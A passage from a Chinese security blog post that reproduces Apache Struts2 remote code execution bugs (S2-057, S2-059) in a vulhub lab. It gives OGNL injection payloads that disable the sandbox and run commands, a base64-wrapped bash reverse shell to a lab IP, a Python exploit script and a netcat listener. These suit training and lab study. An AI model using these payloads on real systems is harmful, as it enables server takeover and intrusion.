+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$&#123;</span><br><span class="line">(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request[&apos;struts.valueStack&apos;].context).(#cr=#ct[&apos;com.opensymphony.xwork2.ActionContext.container&apos;]).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#a=@java.lang.Runtime@getRuntime().exec(&apos;id&apos;)).(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))&#125;</span><br></pre></td></tr></table></figure>
+
+<img src="/img/shentou/vulhub/s2-057/s2-057-02.jpg">
+
+<h2 id="0x04、S2-059-远程代码执行漏洞"><a href="#0x04、S2-059-远程代码执行漏洞" class="headerlink" title="0x04、S2-059 远程代码执行漏洞"></a>0x04、S2-059 远程代码执行漏洞</h2><p><strong>原理</strong></p>
+<p>Apache Struts框架, 会对某些特定的标签的属性值，比如id属性进行二次解析，所以攻击者可以传递将在呈现标签属性时再次解析的OGNL表达式，造成OGNL表达式注入。从而可能造成远程执行代码</p>
+<p><strong>影响版本</strong></p>
+<p>Struts 2.0.0 - Struts 2.5.20</p>
+<p><strong>复现过程</strong></p>
+<p>访问 <code>http://your-ip:8080/?id=%25%7B233*233%7D</code><br>可以发现<code>233*233</code>的结果被解析到了id属性中</p>
+<img src="/img/shentou/vulhub/s2-059/s2-059-01.jpg">
+
+<p>反弹shell</p>
+<p>先确定反弹shell的内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.184.128/6666 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p>经过base64编码后构造poc</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE4NC4xMjgvNjY2NiAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure>
+
+<p>python脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &quot;http://192.168.184.128:8080&quot;</span><br><span class="line">data1 = &#123;</span><br><span class="line">    &quot;id&quot;: &quot;%&#123;(#context=#attr[&apos;struts.valueStack&apos;].context).(#container=#context[&apos;com.opensymphony.xwork2.ActionContext.container&apos;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses(&apos;&apos;)).(#ognlUtil.setExcludedPackageNames(&apos;&apos;))&#125;&quot;</span><br><span class="line">&#125;</span><br><span class="line">data2 = &#123;</span><br><span class="line">    &quot;id&quot;: &quot;%&#123;(#context=#attr[&apos;struts.valueStack&apos;].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec(&apos;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE4NC4xMjgvNjY2NiAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&apos;))&#125;&quot;</span><br><span class="line">&#125;</span><br><span class="line">res1 = requests.post(url, data=data1)</span><br><span class="line"># print(res1.text)</span><br><span class="line">res2 = requests.post(url, data=data2)</span><br><span class="line"># print(res2.text)</span><br></pre></td></tr></table></figure>
+
+<p>开始监听</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 6666</span><br></pre></td></tr></table></figure>
+
+<p>执行poc</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python s2-059.py</span><br></pre></td></tr></table></figure>
+
+<img src="/img/shentou/vulhub/s2-059/s2-059-02.jpg">
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2021/01/27/vulhub靶场struts2漏洞复现（四）/">vuhub靶场struts2漏洞复现（四）</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">obsem</a></p>
+        <p><span>发布时间:</span>2021-01-27, 00:00:00</p>
+        <p><span>最后更新:</span>2021-03-06, 15:56:47</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2021/01/27/vulhub靶场struts2漏洞复现（四）/" title="vuhub靶场struts2漏洞复现（四）">http://yoursite.com/2021/01/27/vulhub靶场struts2漏洞复现（四）/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2021/01/27/vulhub靶场struts2漏洞复现（四）/　　作者: obsem" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2021/01/24/vulhub靶场struts2漏洞复现（三）/">
+                    vuhub靶场struts2漏洞复现（三）
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01、S2-052-远程代码执行漏洞"><span class="toc-number">1.</span> <span class="toc-text">0x01、S2-052 远程代码执行漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02、S2-053-远程代码执行漏洞"><span class="toc-number">2.</span> <span class="toc-text">0x02、S2-053 远程代码执行漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03、S2-057-远程代码执行漏洞"><span class="toc-number">3.</span> <span class="toc-text">0x03、S2-057 远程代码执行漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04、S2-059-远程代码执行漏洞"><span class="toc-number">4.</span> <span class="toc-text">0x04、S2-059 远程代码执行漏洞</span></a></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"vuhub靶场struts2漏洞复现（四）　| obsetear　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2021/01/24/vulhub靶场struts2漏洞复现（三）/" title="下一篇: vuhub靶场struts2漏洞复现（三）">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2021/01/27/vulhub靶场struts2漏洞复现（四）/">vuhub靶场struts2漏洞复现（四）</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/01/24/vulhub靶场struts2漏洞复现（三）/">vuhub靶场struts2漏洞复现（三）</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/01/23/vulhub靶场struts2漏洞复现（二）/">vuhub靶场struts2漏洞复现（二）</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/01/20/vulhub靶场struts2漏洞复现（一）/">vuhub靶场struts2漏洞复现（一）</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/11/21/从文件上传到浅谈.htaccess文件的作用/">从文件上传到浅谈.htaccess文件的作用</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/11/19/记一次简单的渗透练习/">记一次简单的渗透练习</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/10/10/python 正则表达式小结（笔记）/">python正则表达式小结（笔记）</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/10/08/upload-labs通关总结/">upload-labs通关小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/10/04/linux基础知识（笔记）/">Linux基础（笔记）</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/10/03/BUUCTFweb部分解题思路2/">BUUCTFweb部分解题思路（PHP、Babysql、Upload、CheckIn）</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/09/15/BUUCTF部分web题解/">BUUCTF部分web题解（easysql，easy_tornado，Ping Ping Ping）</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/08/26/内网渗透之Linux提权姿势/">Linux提权</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/08/16/内网渗透之windows提权的几种姿势/">windows提权</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/08/06/内网渗透之免杀/">免杀</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/29/内网渗透之CobaltStrike/">CobaltStrike</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/26/内网渗透之Metasploit/">Metasploit</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/25/内网渗透之windows基础/">Windows基础</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/20/浅谈XXE漏洞：从XML到文件读取/">浅谈XXE漏洞：从XML到文件读取</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/04/SSRF漏洞/">SSRF漏洞小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/23/csrf漏洞小结/">CSRF漏洞小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/10/Mysql报错函数小结/">Mysql报错函数小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/02/10/文件包含漏洞小结/">浅谈文件包含漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/21/浅谈php一句话木马/">浅谈一句话木马</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/03/宽字节注入/">宽字节注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/23/攻防世界web系列/">攻防世界web系列</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/10/Owasp juice shop(一)/">Owasp juice shop(一)</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/08/24/PHP代码审计之危险函数/">PHP代码审计之危险函数</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/08/22/PHP超级全局变量/">PHP超级全局变量</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/08/21/一些常见的编码/">一些常见的编码</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/08/17/命令执行&代码执行漏洞/">命令执行&代码执行漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/08/12/Web常见的源码泄露/">Web常见的源码泄露</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/08/09/RSA算法小结/">RSA算法小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/08/08/PHP反序列化/">PHP反序列化学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/08/04/i春秋-misc系列/">i春秋-misc系列</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/31/文件上传漏洞总结/">文件上传漏洞总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/28/隐写术/">隐写术</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/25/SQL注入一些过滤及绕过总结/">SQL注入一些过滤及绕过总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/21/SQL简单注入/">SQL简单注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/20/图片隐写/">图片隐写术</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/18/攻防世界——Misc系列/">攻防世界——Misc系列</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/14/Web——爆破wp/">WEB——爆破wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/10/WEB——php大法wp/">WEB——php大法wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/08/图片隐写——小苹果wp/">图片隐写——小苹果wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/06/10/xss挑战之旅学习笔记/">xss挑战之旅学习笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/06/07/xss学习总结/">xxs学习总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/25/SQL注入姿势（3）/">SQL注入姿势（3）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/12/SQL注入姿势（2）/">SQL注入姿势（2）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/10/SQL注入姿势（1）/">SQL注入姿势（1）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/06/PHP学习笔记（5）/">PHP学习笔记（5）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/05/PHP学习笔记（4）/">PHP学习笔记（4）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/28/php登录界面小结/">PHP登录界面小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/25/PHP学习笔记（3）/">PHP学习笔记（3）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/15/PHP学习笔记（2）/">PHP学习笔记（2）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/07/PHP学习笔记（1）/">PHP学习笔记（1）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/05/哈弗曼树/">哈弗曼树</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/27/css学习笔记/">CSS学习笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/25/HTML学习笔记/">HTML学习笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/25/MySQL的一些常用命令行总结/">MySQL的一些常用命令行总结</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2016-2021 obsem
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 5;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+            
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
